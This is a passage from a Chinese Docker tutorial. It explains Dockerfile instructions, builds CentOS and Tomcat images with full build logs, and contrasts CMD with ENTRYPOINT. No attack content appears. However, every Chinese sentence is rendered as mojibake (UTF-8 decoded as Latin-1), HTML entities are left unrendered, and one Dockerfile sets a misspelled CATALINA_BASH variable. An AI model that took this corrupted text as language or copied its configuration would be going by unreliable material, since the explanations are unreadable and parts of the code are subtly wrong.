(shellå†…éƒ¨å‘½ä»¤)ç¤ºä¾‹ï¼š FROM ubuntu ENTRYPOINT [&quot;top&quot;, &quot;-b&quot;] CMD [&quot;-c&quot;] ï¼ˆ8ï¼‰LABEL&emsp;&emsp;ç”¨äºä¸ºé•œåƒæ·»åŠ å…ƒæ•°æ® &emsp;&emsp;æ³¨æ„ï¼šä½¿ç”¨LABELæŒ‡å®šå…ƒæ•°æ®æ—¶ï¼Œä¸€æ¡LABELæŒ‡å®šå¯ä»¥æŒ‡å®šä¸€æˆ–å¤šæ¡å…ƒæ•°æ®ï¼ŒæŒ‡å®šå¤šæ¡å…ƒæ•°æ®æ—¶ä¸åŒå…ƒæ•°æ®ä¹‹é—´é€šè¿‡ç©ºæ ¼åˆ†éš”ã€‚æ¨èå°†æ‰€æœ‰çš„å…ƒæ•°æ®é€šè¿‡ä¸€æ¡LABELæŒ‡ä»¤æŒ‡å®šï¼Œä»¥å…ç”Ÿæˆè¿‡å¤šçš„ä¸­é—´é•œåƒã€‚ æ ¼å¼ï¼š LABEL &lt;key&gt;=&lt;value&gt; &lt;key&gt;=&lt;value&gt; &lt;key&gt;=&lt;value&gt; ...ç¤ºä¾‹ï¼š LABEL version=&quot;1.0&quot; description=&quot;è¿™æ˜¯ä¸€ä¸ªWebæœåŠ¡å™¨&quot; by=&quot;ITç¬”å½•&quot; ï¼ˆ9ï¼‰ENV&emsp;&emsp;è®¾ç½®ç¯å¢ƒå˜é‡ æ ¼å¼ï¼š ENV &lt;key&gt; &lt;value&gt; #&lt;key&gt;ä¹‹åçš„æ‰€æœ‰å†…å®¹å‡ä¼šè¢«è§†ä¸ºå…¶&lt;value&gt;çš„ç»„æˆéƒ¨åˆ†ï¼Œå› æ­¤ï¼Œä¸€æ¬¡åªèƒ½è®¾ç½®ä¸€ä¸ªå˜é‡ ENV &lt;key&gt;=&lt;value&gt; ... #å¯ä»¥è®¾ç½®å¤šä¸ªå˜é‡ï¼Œæ¯ä¸ªå˜é‡ä¸ºä¸€ä¸ª&quot;&lt;key&gt;=&lt;value&gt;&quot;çš„é”®å€¼å¯¹ï¼Œå¦‚æœ&lt;key&gt;ä¸­åŒ…å«ç©ºæ ¼ï¼Œå¯ä»¥ä½¿ç”¨\\æ¥è¿›è¡Œè½¬ä¹‰ï¼Œä¹Ÿå¯ä»¥é€šè¿‡&quot;&quot;æ¥è¿›è¡Œæ ‡ç¤ºï¼›å¦å¤–ï¼Œåæ–œçº¿ä¹Ÿå¯ä»¥ç”¨äºç»­è¡Œç¤ºä¾‹ï¼š ENV myName John Doe ENV myDog Rex The Dog ENV myCat=fluffy ï¼ˆ10ï¼‰EXPOSE&emsp;&emsp;æŒ‡å®šäºå¤–ç•Œäº¤äº’çš„ç«¯å£ &emsp;&emsp;æ³¨æ„ï¼šEXPOSEå¹¶ä¸ä¼šè®©å®¹å™¨çš„ç«¯å£è®¿é—®åˆ°ä¸»æœºã€‚è¦ä½¿å…¶å¯è®¿é—®ï¼Œéœ€è¦åœ¨docker runè¿è¡Œå®¹å™¨æ—¶é€šè¿‡-pæ¥å‘å¸ƒè¿™äº›ç«¯å£ï¼Œæˆ–é€šè¿‡-På‚æ•°æ¥å‘å¸ƒEXPOSEå¯¼å‡ºçš„æ‰€æœ‰ç«¯å£ æ ¼å¼ï¼š EXPOSE &lt;port&gt; [&lt;port&gt;...]ç¤ºä¾‹ï¼š EXPOSE 80 443 EXPOSE 8080 EXPOSE 11211/tcp 11211/udp ï¼ˆ11ï¼‰VOLUMEç”¨äºæŒ‡å®šæŒä¹…åŒ–ç›®å½• æ³¨æ„ï¼šä¸€ä¸ªå·å¯ä»¥å­˜åœ¨äºä¸€ä¸ªæˆ–å¤šä¸ªå®¹å™¨çš„æŒ‡å®šç›®å½•ï¼Œè¯¥ç›®å½•å¯ä»¥ç»•è¿‡è”åˆæ–‡ä»¶ç³»ç»Ÿï¼Œå¹¶å…·æœ‰ä»¥ä¸‹åŠŸèƒ½ï¼š 1ã€å·å¯ä»¥å®¹å™¨é—´å…±äº«å’Œé‡ç”¨ 2ã€å®¹å™¨å¹¶ä¸ä¸€å®šè¦å’Œå…¶å®ƒå®¹å™¨å…±äº«å· 3ã€ä¿®æ”¹å·åä¼šç«‹å³ç”Ÿæ•ˆ 4ã€å¯¹å·çš„ä¿®æ”¹ä¸ä¼šå¯¹é•œåƒäº§ç”Ÿå½±å“ 5ã€å·ä¼šä¸€ç›´å­˜åœ¨ï¼Œç›´åˆ°æ²¡æœ‰ä»»ä½•å®¹å™¨åœ¨ä½¿ç”¨å®ƒ æ ¼å¼ï¼š VOLUME [&quot;/path/to/dir&quot;]ç¤ºä¾‹ï¼š VOLUME [&quot;/data&quot;] VOLUME [&quot;/var/www&quot;, &quot;/var/log/apache2&quot;, &quot;/etc/apache2&quot; ï¼ˆ12ï¼‰WORKDIRå·¥ä½œç›®å½•ï¼Œç±»ä¼¼äºcdå‘½ä»¤ æ³¨æ„ï¼šé€šè¿‡WORKDIRè®¾ç½®å·¥ä½œç›®å½•åï¼ŒDockerfileä¸­å…¶åçš„å‘½ä»¤RUNã€CMDã€ENTRYPOINTã€ADDã€COPYç­‰å‘½ä»¤éƒ½ä¼šåœ¨è¯¥ç›®å½•ä¸‹æ‰§è¡Œã€‚åœ¨ä½¿ç”¨docker runè¿è¡Œå®¹å™¨æ—¶ï¼Œå¯ä»¥é€šè¿‡-wå‚æ•°è¦†ç›–æ„å»ºæ—¶æ‰€è®¾ç½®çš„å·¥ä½œç›®å½•ã€‚ æ ¼å¼ï¼š WORKDIR /path/to/workdirç¤ºä¾‹ï¼š WORKDIR /a (è¿™æ—¶å·¥ä½œç›®å½•ä¸º/a) WORKDIR b (è¿™æ—¶å·¥ä½œç›®å½•ä¸º/a/b) WORKDIR c (è¿™æ—¶å·¥ä½œç›®å½•ä¸º/a/b/c) ï¼ˆ13ï¼‰USER&emsp;&emsp;æŒ‡å®šè¿è¡Œå®¹å™¨æ—¶çš„ç”¨æˆ·åæˆ– UIDï¼Œåç»­çš„ RUN ä¹Ÿä¼šä½¿ç”¨æŒ‡å®šç”¨æˆ·ã€‚ä½¿ç”¨USERæŒ‡å®šç”¨æˆ·æ—¶ï¼Œå¯ä»¥ä½¿ç”¨ç”¨æˆ·åã€UIDæˆ–GIDï¼Œæˆ–æ˜¯ä¸¤è€…çš„ç»„åˆã€‚å½“æœåŠ¡ä¸éœ€è¦ç®¡ç†å‘˜æƒé™æ—¶ï¼Œå¯ä»¥é€šè¿‡è¯¥å‘½ä»¤æŒ‡å®šè¿è¡Œç”¨æˆ·ã€‚å¹¶ä¸”å¯ä»¥åœ¨ä¹‹å‰åˆ›å»ºæ‰€éœ€è¦çš„ç”¨æˆ· æ³¨æ„ï¼šä½¿ç”¨USERæŒ‡å®šç”¨æˆ·åï¼ŒDockerfileä¸­å…¶åçš„å‘½ä»¤RUNã€CMDã€ENTRYPOINTéƒ½å°†ä½¿ç”¨è¯¥ç”¨æˆ·ã€‚é•œåƒæ„å»ºå®Œæˆåï¼Œé€šè¿‡docker runè¿è¡Œå®¹å™¨æ—¶ï¼Œå¯ä»¥é€šè¿‡-uå‚æ•°æ¥è¦†ç›–æ‰€æŒ‡å®šçš„ç”¨æˆ·ã€‚ æ ¼å¼: USER user USER user:group USER uid USER uid:gid USER user:gid USER uid:group ç¤ºä¾‹ï¼š USER www ï¼ˆ14ï¼‰ARG&emsp;&emsp;ç”¨äºæŒ‡å®šä¼ é€’ç»™æ„å»ºè¿è¡Œæ—¶çš„å˜é‡ æ ¼å¼ï¼š ARG &lt;name&gt;[=&lt;default value&gt;]ç¤ºä¾‹ï¼š ARG site ARG build_user=www ï¼ˆ15ï¼‰ONBUILD&emsp;&emsp;ç”¨äºè®¾ç½®é•œåƒè§¦å‘å™¨ æ³¨æ„ï¼šå½“æ‰€æ„å»ºçš„é•œåƒè¢«ç”¨åšå…¶å®ƒé•œåƒçš„åŸºç¡€é•œåƒï¼Œè¯¥é•œåƒä¸­çš„è§¦å‘å™¨å°†ä¼šè¢«è§¦å‘ æ ¼å¼ï¼š ONBUILD [INSTRUCTION]ç¤ºä¾‹ï¼š ONBUILD ADD . /app/src ONBUILD RUN /usr/local/bin/python-build --dir /app/src 2ã€ä¾‹å­# This my first nginx Dockerfile# Version 1.0# Base images åŸºç¡€é•œåƒFROM centos#MAINTAINER ç»´æŠ¤è€…ä¿¡æ¯MAINTAINER tianfeiyu #ENV è®¾ç½®ç¯å¢ƒå˜é‡ENV PATH /usr/local/nginx/sbin:$PATH#ADD æ–‡ä»¶æ”¾åœ¨å½“å‰ç›®å½•ä¸‹ï¼Œæ‹·è¿‡å»ä¼šè‡ªåŠ¨è§£å‹ADD nginx-1.8.0.tar.gz /usr/local/ ADD epel-release-latest-7.noarch.rpm /usr/local/ #RUN æ‰§è¡Œä»¥ä¸‹å‘½ä»¤ RUN rpm -ivh /usr/local/epel-release-latest-7.noarch.rpmRUN yum install -y wget lftp gcc gcc-c++ make openssl-devel pcre-devel pcre &amp;&amp; yum clean allRUN useradd -s /sbin/nologin -M www#WORKDIR ç›¸å½“äºcdWORKDIR /usr/local/nginx-1.8.0 RUN ./configure --prefix=/usr/local/nginx --user=www --group=www --with-http_ssl_module --with-pcre &amp;&amp; make &amp;&amp; make installRUN echo &quot;daemon off;&quot; &gt;&gt; /etc/nginx.conf#EXPOSE æ˜ å°„ç«¯å£EXPOSE 80#CMD è¿è¡Œä»¥ä¸‹å‘½ä»¤CMD [&quot;nginx&quot;] 3ã€æ€»ç»“ äº”ã€å®æˆ˜ï¼šæ„å»ºè‡ªå·±çš„CentOS1ã€ç¼–å†™DockerFileé…ç½®æ–‡ä»¶FROM centos #æŒ‡å®šcentosä¸ºåŸºç¡€é•œåƒMAINTAINER xdd&lt;123456@qq.com&gt; #ç»´æŠ¤è€…ä¿¡æ¯ ENV MYPATH /usr/local # $MYPATH=&quot;/usr/local&quot;WORKDIR $MYPATH #å°†å·¥ä½œç›®å½•è®¾ç½®ä¸º/usr/localRUN yum -y install vim #æ„å»ºé•œåƒæ—¶ä¸‹è½½å®‰è£…vimRUN yum -y install net-tools #æ„å»ºé•œåƒæ—¶ä¸‹è½½å®‰è£…net-toolsEXPOSE 80 #æš´éœ²80ç«¯å£CMD echo $MYPATH #å®¹å™¨å¯åŠ¨æ—¶è¾“å‡º$MYPATHCMD echo &quot;----end----&quot; #è¦†ç›–ä¸Šä¸€ä¸ªCMDï¼Œå®¹å™¨å¯åŠ¨æ—¶è¾“å‡º----end----CMD /bin/bash #è¦†ç›–ä¸Šä¸€ä¸ªCMDï¼Œå®¹å™¨å¯åŠ¨æ—¶è¿›å…¥/bin/bash 2ã€é€šè¿‡ç¼–å†™çš„DockerFileæ–‡ä»¶æ„å»ºé•œåƒ&emsp;&emsp;å‘½ä»¤è¯´æ˜ï¼šdocker build -f mydockerfile-centos -t mycentos:0.1 . &emsp;&emsp;docker build -f DockerFileæ–‡ä»¶è·¯å¾„ -t é•œåƒå[:TAG]ï¼Œ**.**æŒ‡å®šä»å½“å‰ç›®å½•å‡ºå‘å¯»æ‰¾DockerFile [root@VM-0-15-centos dockerfile]# docker build -f mydockerfile-centos -t mycentos:0.1 .Sending build context to Docker daemon 2.048kBStep 1/10 : FROM centos ---&gt; 300e315adb2fStep 2/10 : MAINTAINER xdd&lt;123456@qq.com&gt; ---&gt; Running in 9c08beadb2c8Removing intermediate container 9c08beadb2c8 ---&gt; e9adad42af2cStep 3/10 : ENV MYPATH /usr/local ---&gt; Running in cdbbbb85ee6bRemoving intermediate container cdbbbb85ee6b ---&gt; 8fcacdecf7adStep 4/10 : WORKDIR $MYPATH ---&gt; Running in 11ea6ae34521Removing intermediate container 11ea6ae34521 ---&gt; 718b6ad3e5efStep 5/10 : RUN yum -y install vim ---&gt; Running in a0431f8c2a80CentOS Linux 8 - AppStream 8.4 MB/s | 8.8 MB 00:01CentOS Linux 8 - BaseOS 6.4 MB/s | 5.6 MB 00:00CentOS Linux 8 - Extras 17 kB/s | 10 kB 00:00Dependencies resolved.================================================================================ Package Arch Version Repository Size================================================================================Installing: vim-enhanced x86_64 2:8.0.1763-15.el8 appstream 1.4 MInstalling dependencies: gpm-libs x86_64 1.20.7-17.el8 appstream 39 k vim-common x86_64 2:8.0.1763-15.el8 appstream 6.3 M vim-filesystem noarch 2:8.0.1763-15.el8 appstream 48 k which x86_64 2.21-12.el8 baseos 49 kTransaction Summary================================================================================Install 5 PackagesTotal download size: 7.8 MInstalled size: 30 MDownloading Packages:(1/5): gpm-libs-1.20.7-17.el8.x86_64.rpm 342 kB/s | 39 kB 00:00(2/5): vim-filesystem-8.0.1763-15.el8.noarch.rp 842 kB/s | 48 kB 00:00(3/5): vim-enhanced-8.0.1763-15.el8.x86_64.rpm 5.0 MB/s | 1.4 MB 00:00(4/5): which-2.21-12.el8.x86_64.rpm 384 kB/s | 49 kB 00:00(5/5): vim-common-8.0.1763-15.el8.x86_64.rpm 15 MB/s | 6.3 MB 00:00--------------------------------------------------------------------------------Total 5.8 MB/s | 7.8 MB 00:01warning: /var/cache/dnf/appstream-02e86d1c976ab532/packages/gpm-libs-1.20.7-17.el8.x86_64.rpm: Header V3 RSA/SHA256 Signature, key ID 8483c65d: NOKEYCentOS Linux 8 - AppStream 1.6 MB/s | 1.6 kB 00:00Importing GPG key 0x8483C65D: Userid : &quot;CentOS (CentOS Official Signing Key) &lt;security@centos.org&gt;&quot; Fingerprint: 99DB 70FA E1D7 CE22 7FB6 4882 05B5 55B3 8483 C65D From : /etc/pki/rpm-gpg/RPM-GPG-KEY-centosofficialKey imported successfullyRunning transaction checkTransaction check succeeded.Running transaction testTransaction test succeeded.Running transaction Preparing : 1/1 Installing : which-2.21-12.el8.x86_64 1/5 Installing : vim-filesystem-2:8.0.1763-15.el8.noarch 2/5 Installing : vim-common-2:8.0.1763-15.el8.x86_64 3/5 Installing : gpm-libs-1.20.7-17.el8.x86_64 4/5 Running scriptlet: gpm-libs-1.20.7-17.el8.x86_64 4/5 Installing : vim-enhanced-2:8.0.1763-15.el8.x86_64 5/5 Running scriptlet: vim-enhanced-2:8.0.1763-15.el8.x86_64 5/5 Running scriptlet: vim-common-2:8.0.1763-15.el8.x86_64 5/5 Verifying : gpm-libs-1.20.7-17.el8.x86_64 1/5 Verifying : vim-common-2:8.0.1763-15.el8.x86_64 2/5 Verifying : vim-enhanced-2:8.0.1763-15.el8.x86_64 3/5 Verifying : vim-filesystem-2:8.0.1763-15.el8.noarch 4/5 Verifying : which-2.21-12.el8.x86_64 5/5Installed: gpm-libs-1.20.7-17.el8.x86_64 vim-common-2:8.0.1763-15.el8.x86_64 vim-enhanced-2:8.0.1763-15.el8.x86_64 vim-filesystem-2:8.0.1763-15.el8.noarch which-2.21-12.el8.x86_64Complete!Removing intermediate container a0431f8c2a80 ---&gt; b24fe1460a37Step 6/10 : RUN yum -y install net-tools ---&gt; Running in 8d93802f92efLast metadata expiration check: 0:00:09 ago on Thu Sep 2 22:08:45 2021.Dependencies resolved.================================================================================ Package Architecture Version Repository Size================================================================================Installing: net-tools x86_64 2.0-0.52.20160912git.el8 baseos 322 kTransaction Summary================================================================================Install 1 PackageTotal download size: 322 kInstalled size: 942 kDownloading Packages:net-tools-2.0-0.52.20160912git.el8.x86_64.rpm 1.5 MB/s | 322 kB 00:00--------------------------------------------------------------------------------Total 496 kB/s | 322 kB 00:00Running transaction checkTransaction check succeeded.Running transaction testTransaction test succeeded.Running transaction Preparing : 1/1 Installing : net-tools-2.0-0.52.20160912git.el8.x86_64 1/1 Running scriptlet: net-tools-2.0-0.52.20160912git.el8.x86_64 1/1 Verifying : net-tools-2.0-0.52.20160912git.el8.x86_64 1/1Installed: net-tools-2.0-0.52.20160912git.el8.x86_64Complete!Removing intermediate container 8d93802f92ef ---&gt; 21faf23714e9Step 7/10 : EXPOSE 80 ---&gt; Running in 9330ed9b0c59Removing intermediate container 9330ed9b0c59 ---&gt; 0979d2a554a2Step 8/10 : CMD echo $MYPATH ---&gt; Running in 44f2eb41253fRemoving intermediate container 44f2eb41253f ---&gt; 77875e680c66Step 9/10 : CMD echo &quot;----end----&quot; ---&gt; Running in 0d852a5a41baRemoving intermediate container 0d852a5a41ba ---&gt; 6accda5d54d3Step 10/10 : CMD /bin/bash ---&gt; Running in ebce2e1a01caRemoving intermediate container ebce2e1a01ca ---&gt; e49ddd3b677cSuccessfully built e49ddd3b677cSuccessfully tagged mycentos:0.1 3ã€æµ‹è¯•è¿è¡Œ&emsp;&emsp;åŸå§‹centos &emsp;&emsp;docker run -it mycentos:0.1ï¼Œdocker runå‘½ä»¤å¦‚æœæŒ‡å®šäº†å‚æ•°ä¼šæŠŠCMDé‡Œçš„å‚æ•°è¦†ç›–ã€‚è¿™é‡Œè¯´æ˜ä¸€ä¸‹ï¼Œå¦‚ï¼šdocker run -it mycentos:0.1 /bin/echo hello å‘½ä»¤çš„å‚æ•°æ˜¯æŒ‡/bin/echo helloè€Œé-itï¼Œ-itåªæ˜¯dockerçš„å‚æ•°ï¼Œè€Œä¸æ˜¯å®¹å™¨çš„å‚æ•°ï¼Œå› æ­¤å¦‚æœä½¿ç”¨æ­¤å‘½ä»¤ï¼Œä¼šè¦†ç›–CMDçš„/bin/bashï¼Œè¾“å‡ºhelloã€‚è€Œè¿™é‡Œæ²¡æœ‰æŒ‡å®šå‚æ•°ï¼Œå› æ­¤ç›´æ¥å°±è¿›å…¥äº†/bin/bashï¼Œè€Œä¸éœ€è¦åƒå¹³æ—¶ä¸€æ ·docker run -it mycentos:0.1 /bin/bashå¤šå†™ä¸€ä¸ª/bin/bashã€‚æƒ³è¦è¿è¡Œå¤šä¸ªå‘½ä»¤ï¼Œå¯ä»¥ä½¿ç”¨ENTRYPOINT æŒ‡ä»¤ æŒ‡å®šä¸€ä¸ªæ–‡ä»¶ï¼Œæ–‡ä»¶ä¸­å†™å¤šä¸ªæŒ‡ä»¤å³å¯ã€‚ &emsp;&emsp;æ–°çš„centos &emsp;&emsp;å¦å¤–ï¼Œè¿˜å¯ä»¥é€šè¿‡docker history é•œåƒID/é•œåƒåç§°æŸ¥çœ‹é•œåƒçš„æ„é€ å†å² &emsp;&emsp;docker history mycentos:0.1ï¼Œå¯ä»¥çœ‹åˆ°ï¼Œæœ€ç»ˆçš„centosé•œåƒæ˜¯ä¸€å±‚ä¸€å±‚å åŠ èµ·æ¥çš„ï¼Œå¾ˆç¬¦åˆè¿™ä¸ªç†å¿µå›¾ å…­ã€CMDå’ŒENTRYPOINTåŒºåˆ«1ã€CMD#æ„å»ºDockerFileæ–‡ä»¶[root@VM-0-15-centos dockerfile]# vim docker-file-cmd#Dockerfileå†…å®¹FROM centosCMD [&quot;ls&quot;,&quot;-a&quot;]#æ„å»ºé•œåƒ[root@VM-0-15-centos dockerfile]# docker build -f docker-file-cmd -t cmdtest .Sending build context to Docker daemon 3.072kBStep 1/2 : FROM centos ---&gt; 300e315adb2fStep 2/2 : CMD [&quot;ls&quot;,&quot;-a&quot;] ---&gt; Running in 9f3bac8d1665Removing intermediate container 9f3bac8d1665 ---&gt; 23a0e7ffae6aSuccessfully built 23a0e7ffae6aSuccessfully tagged cmdtest:latest#å¯åŠ¨å®¹å™¨ï¼Œè°ƒç”¨äº†ls -a[root@VM-0-15-centos dockerfile]# docker run cmdtest....dockerenvbindevetchomeliblib64lost+foundmediamntoptprocrootrunsbinsrvsystmpusrvar#æƒ³ç€å®ç°ls -a -lçš„æ•ˆæœï¼Œç›´æ¥åœ¨åé¢åŠ å…¥-lï¼Œé‚£ä¹ˆ-lå°±è¦†ç›–äº†ls -aï¼Œå› æ­¤å¤±è´¥äº†[root@VM-0-15-centos dockerfile]# docker run cmdtest -ldocker: Error response from daemon: OCI runtime create failed: container_linux.go:380: starting container process caused: exec: &quot;-l&quot;: executable file not found in $PATH: unknown.#æ­£ç¡®çš„æ–¹æ³•å®ç°ls -a -lçš„æ•ˆæœ[root@VM-0-15-centos dockerfile]# docker run cmdtest ls -altotal 56drwxr-xr-x 1 root root 4096 Sep 2 23:28 .drwxr-xr-x 1 root root 4096 Sep 2 23:28 ..-rwxr-xr-x 1 root root 0 Sep 2 23:28 .dockerenvlrwxrwxrwx 1 root root 7 Nov 3 2020 bin -&gt; usr/bindrwxr-xr-x 5 root root 340 Sep 2 23:28 devdrwxr-xr-x 1 root root 4096 Sep 2 23:28 etcdrwxr-xr-x 2 root root 4096 Nov 3 2020 homelrwxrwxrwx 1 root root 7 Nov 3 2020 lib -&gt; usr/liblrwxrwxrwx 1 root root 9 Nov 3 2020 lib64 -&gt; usr/lib64drwx------ 2 root root 4096 Dec 4 2020 lost+founddrwxr-xr-x 2 root root 4096 Nov 3 2020 mediadrwxr-xr-x 2 root root 4096 Nov 3 2020 mntdrwxr-xr-x 2 root root 4096 Nov 3 2020 optdr-xr-xr-x 148 root root 0 Sep 2 23:28 procdr-xr-x--- 2 root root 4096 Dec 4 2020 rootdrwxr-xr-x 11 root root 4096 Dec 4 2020 runlrwxrwxrwx 1 root root 8 Nov 3 2020 sbin -&gt; usr/sbindrwxr-xr-x 2 root root 4096 Nov 3 2020 srvdr-xr-xr-x 13 root root 0 Sep 2 23:28 sysdrwxrwxrwt 7 root root 4096 Dec 4 2020 tmpdrwxr-xr-x 12 root root 4096 Dec 4 2020 usrdrwxr-xr-x 20 root root 4096 Dec 4 2020 var[root@VM-0-15-centos dockerfile]# 2ã€ENTRYPOINT#æ„å»ºDockerFileæ–‡ä»¶[root@VM-0-15-centos dockerfile]# vim docker-file-entrypoint#Dockerfileå†…å®¹FROM centosENTRYPOINT [&quot;ls&quot;,&quot;-a&quot;]#æ„å»ºé•œåƒ[root@VM-0-15-centos dockerfile]# docker build -f docker-file-entrypoint -t entrypointtest .Sending build context to Docker daemon 4.096kBStep 1/2 : FROM centos ---&gt; 300e315adb2fStep 2/2 : ENTRYPOINT [&quot;ls&quot;,&quot;-a&quot;] ---&gt; Running in df8bced1251dRemoving intermediate container df8bced1251d ---&gt; 0691387ed2a7Successfully built 0691387ed2a7Successfully tagged entrypointtest:latest#å¯åŠ¨å®¹å™¨ï¼Œè°ƒç”¨äº†ls -a[root@VM-0-15-centos dockerfile]# docker run entrypointtest....dockerenvbindevetchomeliblib64lost+foundmediamntoptprocrootrunsbinsrvsystmpusrvar#æƒ³ç€å®ç°ls -a -lçš„æ•ˆæœï¼Œç›´æ¥åœ¨åé¢åŠ å…¥-lï¼Œé‚£ä¹ˆls -aå°±è¿½åŠ äº†-lï¼Œå› æ­¤æˆåŠŸäº†[root@VM-0-15-centos dockerfile]# docker run entrypointtest -ltotal 56drwxr-xr-x 1 root root 4096 Sep 2 23:32 .drwxr-xr-x 1 root root 4096 Sep 2 23:32 ..-rwxr-xr-x 1 root root 0 Sep 2 23:32 .dockerenvlrwxrwxrwx 1 root root 7 Nov 3 2020 bin -&gt; usr/bindrwxr-xr-x 5 root root 340 Sep 2 23:32 devdrwxr-xr-x 1 root root 4096 Sep 2 23:32 etcdrwxr-xr-x 2 root root 4096 Nov 3 2020 homelrwxrwxrwx 1 root root 7 Nov 3 2020 lib -&gt; usr/liblrwxrwxrwx 1 root root 9 Nov 3 2020 lib64 -&gt; usr/lib64drwx------ 2 root root 4096 Dec 4 2020 lost+founddrwxr-xr-x 2 root root 4096 Nov 3 2020 mediadrwxr-xr-x 2 root root 4096 Nov 3 2020 mntdrwxr-xr-x 2 root root 4096 Nov 3 2020 optdr-xr-xr-x 150 root root 0 Sep 2 23:32 procdr-xr-x--- 2 root root 4096 Dec 4 2020 rootdrwxr-xr-x 11 root root 4096 Dec 4 2020 runlrwxrwxrwx 1 root root 8 Nov 3 2020 sbin -&gt; usr/sbindrwxr-xr-x 2 root root 4096 Nov 3 2020 srvdr-xr-xr-x 13 root root 0 Sep 2 23:28 sysdrwxrwxrwt 7 root root 4096 Dec 4 2020 tmpdrwxr-xr-x 12 root root 4096 Dec 4 2020 usrdrwxr-xr-x 20 root root 4096 Dec 4 2020 var#ls -aè¿½åŠ ls -alå˜æˆäº†ls -a ls -alï¼Œå› æ­¤å¤±è´¥[root@VM-0-15-centos dockerfile]# docker run entrypointtest ls -alls: cannot access &#x27;ls&#x27;: No such file or directory ä¸ƒã€å®æˆ˜ï¼šTomcaté•œåƒ1ã€æ–‡ä»¶å‡†å¤‡&emsp;&emsp;å‡†å¤‡é•œåƒæ–‡ä»¶ï¼Œtomcatå‹ç¼©åŒ…ï¼ˆå®˜ç½‘ä¸‹è½½ï¼‰ï¼Œjdkå‹ç¼©åŒ…ï¼ˆå®˜ç½‘ä¸‹è½½ï¼‰ï¼Œæ–°å»ºä¸€ä¸ªç©ºçš„readme.txtæ–‡ä»¶ &emsp;&emsp;ä¹Ÿå¯ç”¨æˆ‘ä¸‹è½½å¥½çš„ï¼Œç™¾åº¦ç½‘ç›˜é“¾æ¥ï¼šhttps://pan.baidu.com/s/1QjtWSmtvss5fUUex5I_ISQ æå–ç ï¼šccfj 2ã€ç¼–å†™dockerfileæ–‡ä»¶&emsp;&emsp;å®˜æ–¹å‘½å Dockerfile ï¼Œbuildçš„æ—¶å€™ä¼šè‡ªåŠ¨å¯»æ‰¾è¿™ä¸ªæ–‡ä»¶ï¼Œå°±ä¸éœ€è¦**-f**æŒ‡å®šäº† FROM centosMAINTAINER xdd&lt;123456789@qq.com&gt;COPY readme.txt /usr/local/readme.txtADD jdk-8u301-linux-x64.tar.gz /usr/localADD apache-tomcat-10.0.10.tar.gz /usr/localRUN yum -y install vimENV MYPATH /usr/localWORKDIR $MYPATH#æ³¨æ„è¿™ä¸ªå¦‚æœç”¨çš„è·Ÿæˆ‘ä¸€æ ·å¿…é¡»æ˜¯jdk1.8.0_301ï¼Œä¸ç„¶åé¢ä¼šæŠ¥é”™è¿è¡Œä¸èµ·æ¥tomcatï¼Œæ·±åˆ»æ•™è®­#é”™è¯¯ç¤ºèŒƒï¼šENV JAVA_HOME /usr/local/jdk8u301 æˆ‘æƒ³å½“ç„¶çš„å°±è®¾ç½®äº†ä¸ªåå­—ï¼Œç»“æœæ˜¯é”™çš„#è§£å‹åçš„åå­—ä¸ºjdk1.8.0_301ï¼Œå› æ­¤è¿™é‡Œæœ€å¥½ä¹Ÿè®¾ç½®jdk1.8.0_301ENV JAVA_HOME /usr/local/jdk1.8.0_301ENV CLASSPATH $JAVA_HOME/lib/dt.jar:$JAVA_HOME/lib/tools.jarENV CATALINA_HOME /usr/local/apache-tomcat-10.0.10ENV CATALINA_BASH /usr/local/apache-tomcat-10.0.10ENV PATH $PATH:$JAVA_HOME/bin:$CATALINA_HOME/lib:$CATALINA_HOME/binEXPOSE 8080#tail -F:ç­‰åŒäº--follow=name --retryï¼Œæ ¹æ®æ–‡ä»¶åè¿›è¡Œè¿½è¸ªï¼Œå¹¶ä¿æŒé‡è¯•ï¼Œå³è¯¥æ–‡ä»¶è¢«åˆ é™¤æˆ–æ”¹ååï¼Œå¦‚æœå†æ¬¡åˆ›å»ºç›¸åŒçš„æ–‡ä»¶åï¼Œä¼šç»§ç»­è¿½è¸ªCMD /usr/local/apache-tomcat-10.0.10/bin/startup.sh &amp;&amp; tail -F /usr/local/apache-tomcat-10.0.10/logs/catalina.out 3ã€æ„å»ºé•œåƒ&emsp;&emsp;docker build -t diytomcat . [root@VM-0-15-centos tomcat]# docker build -t diytomcat .Sending build context to Docker daemon 157.4MBStep 1/15 : FROM centos ---&gt; 300e315adb2fStep 2/15 : MAINTAINER xdd&lt;123456789@qq.com&gt; ---&gt; Running in d3da61a8177aRemoving intermediate container d3da61a8177a ---&gt; 9e1df92badf0Step 3/15 : COPY readme.txt /usr/local/readme.txt ---&gt; 22fc0081ce2dStep 4/15 : ADD jdk-8u301-linux-x64.tar.gz /usr/local ---&gt; f4ec24113686Step 5/15 : ADD apache-tomcat-10.0.10.tar.gz /usr/local ---&gt; a1b470e2bd7dStep 6/15 : RUN yum -y install vim ---&gt; Running in 614daf07d5b9CentOS Linux 8 - AppStream 9.0 MB/s | 8.8 MB 00:00CentOS Linux 8 - BaseOS 8.2 MB/s | 5.6 MB 00:00CentOS Linux 8 - Extras 11 kB/s | 10 kB 00:00Last metadata expiration check: 0:00:01 ago on Sat Sep 4 16:37:32 2021.Dependencies resolved.================================================================================ Package Arch Version Repository Size================================================================================Installing: vim-enhanced x86_64 2:8.0.1763-15.el8 appstream 1.4 MInstalling dependencies: gpm-libs x86_64 1.20.7-17.el8 appstream 39 k vim-common x86_64 2:8.0.1763-15.el8 appstream 6.3 M vim-filesystem noarch 2:8.0.1763-15.el8 appstream 48 k which x86_64 2.21-12.el8 baseos 49 kTransaction Summary================================================================================Install 5 PackagesTotal download size: 7.8 MInstalled size: 30 MDownloading Packages:(1/5): gpm-libs-1.20.7-17.el8.x86_64.rpm 328 kB/s | 39 kB 00:00(2/5): vim-filesystem-8.0.1763-15.el8.noarch.rp 824 kB/s | 48 kB 00:00(3/5): which-2.21-12.el8.x86_64.rpm 876 kB/s | 49 kB 00:00(4/5): vim-enhanced-8.0.1763-15.el8.x86_64.rpm 4.9 MB/s | 1.4 MB 00:00(5/5): vim-common-8.0.1763-15.el8.x86_64.rpm 16 MB/s | 6.3 MB 00:00--------------------------------------------------------------------------------Total 3.1 MB/s | 7.8 MB 00:02warning: /var/cache/dnf/appstream-02e86d1c976ab532/packages/gpm-libs-1.20.7-17.el8.x86_64.rpm: Header V3 RSA/SHA256 Signature, key ID 8483c65d: NOKEYCentOS Linux 8 - AppStream 1.6 MB/s | 1.6 kB 00:00Importing GPG key 0x8483C65D: Userid : &quot;CentOS (CentOS Official Signing Key) &lt;security@centos.org&gt;&quot; Fingerprint: 99DB 70FA E1D7 CE22 7FB6 4882 